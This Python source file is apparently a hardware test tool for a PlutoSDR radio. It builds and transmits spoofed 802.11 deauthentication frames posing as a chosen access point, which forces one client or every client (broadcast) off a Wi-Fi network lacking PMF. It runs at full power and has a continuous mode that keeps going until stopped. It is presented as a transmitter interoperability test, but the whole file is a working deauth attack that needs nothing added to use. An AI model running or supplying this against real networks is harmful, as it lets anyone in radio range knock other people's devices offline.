#!/usr/bin/env python3
"""Deauthentication injection — TX interop sea trial.

Transmits 802.11 deauthentication frames spoofed as a target AP,
causing a connected client to disconnect. Validates that our TX PHY
produces frames that real STAs accept as authentic management frames.

PREREQUISITES:
  - Target AP must NOT use PMF (802.11w). Verify with check_pmf.py.
  - Client must be associated to the target AP.
  - PlutoSDR must be on the same channel as the target AP.

HARDWARE SETUP:
  PlutoSDR TX → 5 GHz antenna, within range of target client

Usage:
    # Deauth a specific client from a specific AP
    python tools/hardware/test_tx_deauth.py \\
        --bssid aa:bb:cc:dd:ee:01 \\
        --client aa:bb:cc:dd:ee:02

    # Broadcast deauth (all clients)
    python tools/hardware/test_tx_deauth.py \\
        --bssid aa:bb:cc:dd:ee:01

    # Custom burst parameters
    python tools/hardware/test_tx_deauth.py \\
        --bssid aa:bb:cc:dd:ee:01 \\
        --client aa:bb:cc:dd:ee:02 \\
        --count 10 --interval 5

Verification:
    macOS:  Watch for WiFi disconnect notification, or:
            ping -c1 192.168.1.1  (should fail after deauth)
            networksetup -getairportnetwork en0
    Linux:  nmcli dev status | grep wifi
            journalctl -u NetworkManager --since "1 min ago"
"""

import argparse
import os
import signal
import sys
import time

import numpy as np

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "python"))
sys.path.insert(0, os.path.dirname(__file__))

from py80211.gen_ofdm_frame import generate_frame, SAMPLE_RATE
from py80211.mac_frames import build_deauth, BROADCAST
from frame_utils import CHANNEL_FREQ

# --- Defaults ---
DEFAULT_CHANNEL = 36
DEFAULT_RATE = 6               # deauth at lowest rate for reliability
DEFAULT_TX_ATTEN = 0           # max power
DEFAULT_BURST_COUNT = 5        # frames per burst
DEFAULT_BURST_INTERVAL_MS = 2  # ms between frames within a burst
DEFAULT_ROUNDS = 3             # number of bursts
DEFAULT_ROUND_INTERVAL_MS = 100  # ms between bursts
DEFAULT_REASON = 7             # Class 3 frame from nonassociated STA


def parse_mac(mac_str: str) -> bytes:
    """Parse MAC address string to 6 bytes."""
    parts = mac_str.strip().split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC address: {mac_str}")
    return bytes(int(p, 16) for p in parts)


def mac_to_str(mac_bytes: bytes) -> str:
    """Format MAC bytes as colon-separated hex string."""
    return ":".join(f"{b:02x}" for b in mac_bytes)


def build_deauth_waveform(da: bytes, bssid: bytes, reason: int,
                          rate_mbps: int) -> np.ndarray:
    """Build a single deauth frame as baseband IQ.

    The frame is spoofed as coming from the AP (sa=bssid) to the client (da).
    """
    psdu = build_deauth(da=da, sa=bssid, bssid=bssid, reason=reason)
    iq, meta = generate_frame(rate_mbps, psdu)
    return iq


def build_burst_buffer(da: bytes, bssid: bytes, reason: int, rate_mbps: int,
                       burst_count: int, interval_ms: float) -> np.ndarray:
    """Build a buffer containing a burst of deauth frames with gaps.

    The buffer contains `burst_count` identical deauth frames separated by
    silence gaps of `interval_ms` milliseconds.
    """
    frame_iq = build_deauth_waveform(da, bssid, reason, rate_mbps)
    gap_samples = int(interval_ms * 1e-3 * SAMPLE_RATE)

    # Build: [frame][gap][frame][gap]...[frame][trailing gap]
    parts = []
    for i in range(burst_count):
        parts.append(frame_iq)
        parts.append(np.zeros(gap_samples, dtype=np.complex64))

    return np.concatenate(parts)


def main():
    parser = argparse.ArgumentParser(
        description="Deauth injection — TX interop test",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --bssid aa:bb:cc:dd:ee:01 --client aa:bb:cc:dd:ee:02
  %(prog)s --bssid aa:bb:cc:dd:ee:01  # broadcast deauth (all clients)
  %(prog)s --bssid aa:bb:cc:dd:ee:01 --client aa:bb:cc:dd:ee:02 --rounds 10
""")
    parser.add_argument("--bssid", type=str, required=True,
                        help="Target AP BSSID (required)")
    parser.add_argument("--client", type=str, default=None,
                        help="Target client MAC (default: broadcast ff:ff:ff:ff:ff:ff)")
    parser.add_argument("--channel", type=int, default=DEFAULT_CHANNEL,
                        help=f"WiFi channel (default: {DEFAULT_CHANNEL})")
    parser.add_argument("--reason", type=int, default=DEFAULT_REASON,
                        help=f"Deauth reason code (default: {DEFAULT_REASON})")
    parser.add_argument("--rate", type=int, default=DEFAULT_RATE,
                        help=f"PHY rate in Mbps (default: {DEFAULT_RATE})")
    parser.add_argument("--tx-atten", type=float, default=DEFAULT_TX_ATTEN,
                        help=f"TX attenuation in dB (default: {DEFAULT_TX_ATTEN})")
    parser.add_argument("--count", type=int, default=DEFAULT_BURST_COUNT,
                        help=f"Frames per burst (default: {DEFAULT_BURST_COUNT})")
    parser.add_argument("--interval", type=float, default=DEFAULT_BURST_INTERVAL_MS,
                        help=f"Inter-frame gap within burst in ms (default: {DEFAULT_BURST_INTERVAL_MS})")
    parser.add_argument("--rounds", type=int, default=DEFAULT_ROUNDS,
                        help=f"Number of bursts to send (default: {DEFAULT_ROUNDS})")
    parser.add_argument("--round-interval", type=float,
                        default=DEFAULT_ROUND_INTERVAL_MS,
                        help=f"Gap between bursts in ms (default: {DEFAULT_ROUND_INTERVAL_MS})")
    parser.add_argument("--continuous", action="store_true",
                        help="Keep sending bursts until Ctrl-C")
    parser.add_argument("--uri", type=str, default=None,
                        help="PlutoSDR URI")
    parser.add_argument("--dry-run", action="store_true",
                        help="Build waveform and print stats without transmitting")
    args = parser.parse_args()

    # Parse addresses
    bssid = parse_mac(args.bssid)
    if args.client:
        da = parse_mac(args.client)
        target_desc = f"client {mac_to_str(da)}"
    else:
        da = BROADCAST
        target_desc = "broadcast (all clients)"

    # Resolve channel
    if args.channel not in CHANNEL_FREQ:
        sys.exit(f"Unknown channel {args.channel}. "
                 f"Supported: {sorted(CHANNEL_FREQ.keys())}")
    freq = CHANNEL_FREQ[args.channel]

    print("=" * 60)
    print("DEAUTH INJECTION — TX INTEROP TEST")
    print("=" * 60)
    print(f"  Target AP:     {mac_to_str(bssid)}")
    print(f"  Target client: {target_desc}")
    print(f"  Channel:       {args.channel} ({freq/1e6:.0f} MHz)")
    print(f"  Reason code:   {args.reason}")
    print(f"  Rate:          {args.rate} Mbps")
    print(f"  TX atten:      {args.tx_atten} dB")
    print(f"  Burst:         {args.count} frames, {args.interval} ms apart")
    print(f"  Rounds:        {'continuous' if args.continuous else args.rounds}"
          f" ({args.round_interval} ms between)")
    print()

    # Build deauth frame
    frame_iq = build_deauth_waveform(da, bssid, args.reason, args.rate)
    print(f"  Frame:         {len(frame_iq)} samples "
          f"({len(frame_iq)/SAMPLE_RATE*1e6:.0f} us)")

    # Build burst buffer
    burst_iq = build_burst_buffer(da, bssid, args.reason, args.rate,
                                  args.count, args.interval)
    burst_ms = len(burst_iq) / SAMPLE_RATE * 1000
    print(f"  Burst buffer:  {len(burst_iq):,} samples ({burst_ms:.1f} ms)")
    print()

    if args.dry_run:
        print("DRY RUN — not transmitting.")
        print(f"  Peak amplitude: {np.max(np.abs(frame_iq)):.4f}")
        # Show the raw PSDU for verification
        psdu = build_deauth(da=da, sa=bssid, bssid=bssid, reason=args.reason)
        print(f"  PSDU ({len(psdu)} bytes): {psdu.hex()}")
        print(f"  FC: 0x{psdu[1]:02x}{psdu[0]:02x} (Deauth)")
        print(f"  DA: {mac_to_str(psdu[4:10])}")
        print(f"  SA: {mac_to_str(psdu[10:16])}")
        print(f"  BSSID: {mac_to_str(psdu[16:22])}")
        print(f"  Reason: {int.from_bytes(psdu[24:26], 'little')}")
        return

    # Connect to PlutoSDR
    from pluto import find_pluto, configure_tx, transmit, stop_tx

    uri, sdr = find_pluto(args.uri)
    print(f"PlutoSDR: {uri}")
    configure_tx(sdr, freq, attenuation_db=args.tx_atten)

    # Transmission loop
    # Strategy: load burst into cyclic buffer, let it transmit for the
    # burst duration, then stop. Repeat for each round.
    # For continuous mode, we keep the cyclic buffer running.

    if args.continuous:
        print("CONTINUOUS MODE — sending deauth bursts until Ctrl-C")
        print("Press Ctrl-C to stop.")
        print()

        stopped = False

        def handle_sigint(sig, frame):
            nonlocal stopped
            stopped = True

        signal.signal(signal.SIGINT, handle_sigint)

        round_num = 0
        transmit(sdr, burst_iq)
        while not stopped:
            round_num += 1
            # The cyclic buffer keeps repeating. Each repetition is one burst.
            # We just need to let it run. Print status periodically.
            time.sleep(args.round_interval / 1000.0)
            if round_num % 10 == 0:
                print(f"  ... {round_num} bursts sent")

        stop_tx(sdr)
        print(f"\nStopped after ~{round_num} bursts.")
    else:
        print(f"Sending {args.rounds} burst(s)...")
        print()

        for r in range(args.rounds):
            # Load and transmit one burst
            transmit(sdr, burst_iq)

            # Wait for burst to play out
            # The cyclic buffer repeats, so we wait just long enough for
            # one pass of the burst, then stop before it repeats
            time.sleep(burst_ms / 1000.0 + 0.005)  # +5ms margin
            stop_tx(sdr)

            print(f"  Burst {r+1}/{args.rounds} sent "
                  f"({args.count} frames)")

            # Inter-round gap
            if r < args.rounds - 1:
                time.sleep(args.round_interval / 1000.0)

        print()
        total_frames = args.rounds * args.count
        print(f"Done. Sent {total_frames} deauth frames in "
              f"{args.rounds} burst(s).")
        print()
        print("Check target client:")
        print("  macOS:  networksetup -getairportnetwork en0")
        print("  Linux:  nmcli dev status | grep wifi")


if __name__ == "__main__":
    main()
